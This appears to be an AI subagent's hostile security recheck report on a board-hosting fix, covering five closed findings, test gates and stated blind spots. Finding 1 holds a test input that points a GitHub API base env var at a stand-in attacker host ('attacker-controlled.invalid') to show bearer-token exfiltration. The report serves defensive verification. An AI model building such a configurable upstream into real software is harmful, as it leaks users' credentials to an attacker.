# Hostile Recheck Report: Standalone Board Hosting Correction

- **Candidate Commits:** `c828bf3` (product fix), `848c9f8` (test regressions), `cd0734b` (builder report)
- **Slice Commit:** `b8e517c`
- **Base Commit:** `2dfbb22`
- **Branch:** `feat/board-hosting`
- **Rechecker:** Independent Hostile Subagent (`9router/engineer`)
- **Date:** 2026-10-26 UTC

---

## Verdicts

| Dimension | Verdict | Summary |
| :--- | :--- | :--- |
| **Security** | **APPROVED** | `BOARD_GITHUB_API_BASE` and arbitrary upstream redirects completely eliminated; token strictly bound to fixed `https://api.github.com` default; upstream redirects rejected. |
| **Spec Compliance** | **PASS** | Scope creep removed; configurable host, `/health`, start script, and honest operations section verified. |
| **Quality** | **APPROVED** | Honest `'unknown'` version fallback on failed reads; dynamic version testing; order-independent start tests via `ensureBundleBuilt()`; documented HEAD 405 method handling. |
| **Machine Verdict** | **PROCEED** | All 5 hostile review findings closed with verified discriminating red/green evidence. All gates green. |

---

## Findings Status & Verification Details

### Finding 1: Unapproved `BOARD_GITHUB_API_BASE` Token Exfiltration Vector (HIGH)
- **Status:** CLOSED
- **Locations Verified:** `web/server/config.ts:282`, `web/server/config.ts:290-294`, `web/README.md:33-36,154-158`, `web/tests/hosting.test.mjs:177-226`
- **Red-Before Evidence (`b8e517c`):**
  - Executing `loadConfig({ BOARD_GITHUB_API_BASE: 'http://attacker-controlled.invalid:8888', ... })` against `b8e517c:web/server/config.ts` populated `config.githubApiBase = 'http://attacker-controlled.invalid:8888'`, causing bearer token exfiltration on startup (`AssertionError: 'http://attacker-controlled.invalid:8888' !== 'https://api.github.com'`).
- **Green-After Evidence (`c828bf3` / `848c9f8`):**
  - `web/server/config.ts` removes `BOARD_GITHUB_API_BASE` reading entirely; `config.githubApiBase` is hardcoded to `DEFAULT_GITHUB_API_BASE` (`https://api.github.com`).
  - `describeConfig` no longer outputs `githubApiBase`.
  - Upstream requests strictly target `https://api.github.com/` even when hostile env var is set (verified in `recheck-upstream.mjs`).
  - `web/server/github.ts:164,172-178` enforces `redirect: 'manual'` and throws `GitHubError` on 3xx responses, preventing token redirection.
  - Subprocess tests mock fetch via Node's `--import` test hook (`PRELOAD_FETCH`), with zero modifications to production code.

### Finding 2: False Health Signal Version Fallback & Brittle Literal Assertions (MEDIUM)
- **Status:** CLOSED
- **Locations Verified:** `web/server/app.ts:107-119`, `web/tests/hosting.test.mjs:15,127,159-175`
- **Red-Before Evidence (`b8e517c`):**
  - `b8e517c:web/server/app.ts:117` contained literal `cachedVersion = '1.2.1'`. When `package.json` read failed, `/health` returned falsified version identity `'1.2.1'`.
- **Green-After Evidence (`c828bf3` / `848c9f8`):**
  - `web/server/app.ts:118` returns honest fallback `'unknown'` on read/parse failures.
  - Test suite dynamically reads root `package.json` version (`EXPECTED_VERSION = pkg.version`) rather than hardcoding literals.
  - Regression test `/health returns version "unknown" when package.json cannot be read` verifies honest `'unknown'` response end-to-end (verified in `recheck-version.mjs`).

### Finding 3: Inter-Test State Dependency in `hosting.test.mjs` (LOW)
- **Status:** CLOSED
- **Locations Verified:** `web/tests/hosting.test.mjs:23-41,292,352`
- **Red-Before Evidence (`b8e517c`):**
  - Running `rm -rf web/dist && node --test --test-name-pattern="npm run start:web" web/tests/hosting.test.mjs` on `b8e517c` failed with `MODULE_NOT_FOUND` (exit 1) because Test 9 depended on Test 8 to build `web/dist/server.mjs`.
- **Green-After Evidence (`848c9f8`):**
  - `ensureBundleBuilt()` added to `web/tests/hosting.test.mjs` and invoked by both Test 8 and Test 9.
  - Running Test 9 in isolation with `web/dist` deleted succeeds cleanly in ~1.4s (exit 0) (verified in `recheck-start-isolation.mjs`).

### Finding 4: Documentation Gap for `npm run start:web` in Root README (LOW)
- **Status:** CLOSED
- **Locations Verified:** `README.md:121`
- **Red-Before Evidence (`b8e517c`):**
  - `b8e517c:README.md` listed `npm run start:web` without noting that `npm run build` does not produce `web/dist/server.mjs`.
- **Green-After Evidence (`c828bf3`):**
  - `README.md:121` explicitly documents: `Requires building the bundle first via npx esbuild web/server.ts --bundle --platform=node --format=esm --target=node20 --packages=external --outfile=web/dist/server.mjs (not built by npm run build).`

### Finding 5: Method Behavior for `/health` (INFO)
- **Status:** CLOSED
- **Locations Verified:** `web/README.md:180`, `web/tests/hosting.test.mjs:148`
- **Red-Before Evidence (`b8e517c`):**
  - `b8e517c:web/tests/hosting.test.mjs:111` tested only `['POST', 'PUT', 'DELETE', 'PATCH']`, omitting `HEAD`.
- **Green-After Evidence (`c828bf3` / `848c9f8`):**
  - `web/README.md:180` documents: `Only GET is supported; HEAD and all other non-GET methods return HTTP 405 with Allow: GET. Automated monitoring and health probes must use GET.`
  - `web/tests/hosting.test.mjs:148` tests `['POST', 'PUT', 'DELETE', 'PATCH', 'HEAD']`, verifying status 405 and `Allow: GET` (verified in `recheck-health-methods.mjs`).

---

## Gate Verification Results

| Gate | Target / Command | Result | Exit | Notes |
| :--- | :--- | :--- | :--- | :--- |
| **Hosting Tests** | `node --test web/tests/hosting.test.mjs` | **PASS** (11/11) | 0 | Duration ~4.2s |
| **Full Web Tests** | `node --test web/tests/*.test.mjs` | **PASS** (349/349) | 0 | 338 base + 11 hosting tests |
| **Root Test Suite** | `npm test` | **PASS** (517/517) | 0 | Duration ~20.8s clean |
| **Web TypeScript** | `npx tsc -p web/tsconfig.json` | **PASS** | 0 | 0 errors |
| **Root TypeScript** | `npm run typecheck` | **PASS** | 0 | 0 errors |
| **Server Bundle Build** | `npx esbuild web/server.ts --bundle --platform=node --format=esm --target=node20 --packages=external --outfile=web/dist/server.mjs` | **PASS** (101.1 kb) | 0 | Build time ~45ms |
| **Bundle Hash** | `sha256sum web/dist/server.mjs` | `c385ced6c8fee23852350aa817937ec8ddf5a871dc43bed5be8af0e587674b5d` | 0 | Byte-exact match with correction |
| **Start Isolation Test** | `rm -rf web/dist && node --test --test-name-pattern="npm run start:web" web/tests/hosting.test.mjs` | **PASS** (1/1) | 0 | On-demand bundle generation verified |

---

## Diff Discipline

A line-by-line inspection of `git diff b8e517c..cd0734b` confirms:
- Only 5 files touched (`README.md`, `web/README.md`, `web/server/app.ts`, `web/server/config.ts`, `web/tests/hosting.test.mjs`).
- Zero scope expansion or unrelated edits.
- Zero assertions deleted, skipped, or weakened.
- All new tests strictly discriminate the remediated failure modes.

---

## Blind Spots & Limits

The following remain external to this isolated worktree:
1. **Reverse proxy / TLS termination:** No live Traefik, Caddy, or TLS certificate validation exercised.
2. **Container lifecycle & port publishing:** No Docker host port recreation or container restart performed.
3. **External restart supervision:** Process supervisor / init daemon persistence not tested.
4. **Live GitHub upstream:** All testing used synthetic mocks; authentic GitHub API rate limits and token authentication were not queried.
